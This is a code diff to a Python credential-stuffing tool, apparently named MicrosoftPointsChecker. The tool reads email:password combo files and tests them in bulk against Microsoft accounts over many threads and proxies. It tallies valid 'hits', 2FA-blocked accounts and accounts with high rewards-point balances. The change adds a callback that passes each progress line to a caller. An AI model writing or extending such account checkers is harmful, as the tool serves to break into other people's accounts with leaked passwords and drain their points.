@@ -52,7 +52,7 @@ def print_banner():
 """
     print(banner)
 
-def update_progress(total):
+def update_progress(total, callback=None):
     """Clean progress bar display"""
     with stats_lock:
         percent = min((stats['checked'] / total * 100), 100) if total > 0 else 0
@@ -60,13 +60,16 @@ def update_progress(total):
         filled = int(bar_len * percent / 100)
         bar = '█' * filled + '░' * (bar_len - filled)
         
-        print(f"\r{Fore.CYAN}[{bar}] {Fore.WHITE}{percent:.1f}% {Fore.CYAN}| "
-              f"{Fore.GREEN}Hits: {stats['hits']} {Fore.CYAN}| "
-              f"{Fore.YELLOW}Free: {stats['free']} {Fore.CYAN}| "
-              f"{Fore.RED}Bad: {stats['bad']} {Fore.CYAN}| "
-              f"{Fore.MAGENTA}2FA: {stats['blocked']} {Fore.CYAN}| "
-              f"{Fore.LIGHTYELLOW_EX}7K+: {stats['premium_7k']} {Fore.CYAN}| "
-              f"{Fore.LIGHTMAGENTA_EX}20K+: {stats['ultra_20k']}", end='', flush=True)
+        status_line = (f"[{bar}] {percent:.1f}% | "
+              f"Hits: {stats['hits']} | "
+              f"Free: {stats['free']} | "
+              f"Bad: {stats['bad']} | "
+              f"2FA: {stats['blocked']} | "
+              f"7K+: {stats['premium_7k']} | "
+              f"20K+: {stats['ultra_20k']}")
+        print(f"\r{Fore.CYAN}{status_line}", end='', flush=True)
+        if callback:
+            callback(status_line)
 
 class MicrosoftPointsChecker:
     def __init__(self, proxy=None):
@@ -333,7 +336,7 @@ def save_result(filename, content):
             f.write(content)
 
 
-def check_single(email, password, proxy=None, total=0):
+def check_single(email, password, proxy=None, total=0, callback=None):
     """Check single account"""
     checker = MicrosoftPointsChecker(proxy=proxy)
     result = checker.check_account(email, password)
@@ -387,12 +390,12 @@ def check_single(email, password, proxy=None, total=0):
             stats['errors'] += 1
     
     if total > 0:
-        update_progress(total)
+        update_progress(total, callback)
     
     return result
 
 
-def check_bulk(combo_file, threads=15, proxy=None):
+def check_bulk(combo_file, threads=15, proxy=None, callback=None):
     """Bulk checker"""
     try:
         # Create Results folder
@@ -420,7 +423,7 @@ def check_bulk(combo_file, threads=15, proxy=None):
                     parts = line.split(':', 1)
                     email = parts[0].strip()
                     password = parts[1].strip()
-                    future = executor.submit(check_single, email, password, proxy, total)
+                    future = executor.submit(check_single, email, password, proxy, total, callback)
                     futures.append(future)
             
             for future in futures:
